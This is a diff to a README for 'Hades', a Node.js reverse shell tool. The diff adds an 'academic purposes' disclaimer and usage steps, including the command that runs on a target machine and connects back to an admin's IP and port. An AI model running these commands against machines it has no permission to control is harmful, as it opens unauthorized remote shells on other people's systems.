@@ -5,10 +5,16 @@ This program is written in Typescript and is made to run with [Node.js](https://
 
 ![image info](demo.png)
 
-<!-- Note that this program is compilable using , and the last version is compiled in the `./bin` directory. -->
-
 ## How to use
+Disclaimer
+- This reverse shell is for academic purposes, the use of this software is your responsibility.
+- This software is still in development, not all the features are implemented yet.
 
+To use this program, 
+1) Garb a compiled version of this program.
+2) Run `Hades -a [port to listen on]` on the main machine.
+3) Run `Hades -c [admin's port] [admin's ip]` on a target machine.
+4) Done !
 
 ## Compile using Nexe
 To compile from source, you will need to follow the instructions listed below.
@@ -25,6 +31,3 @@ Here is the list of used libraries
 - `Axios` - Used to send requests.
 - `WSS` - Used for socket connections.
 - `Express` - Used to setup servers.
-
-<!-- ## Disclaimer ##
-This repository is for academic purposes, the use of this software is your responsibility. -->
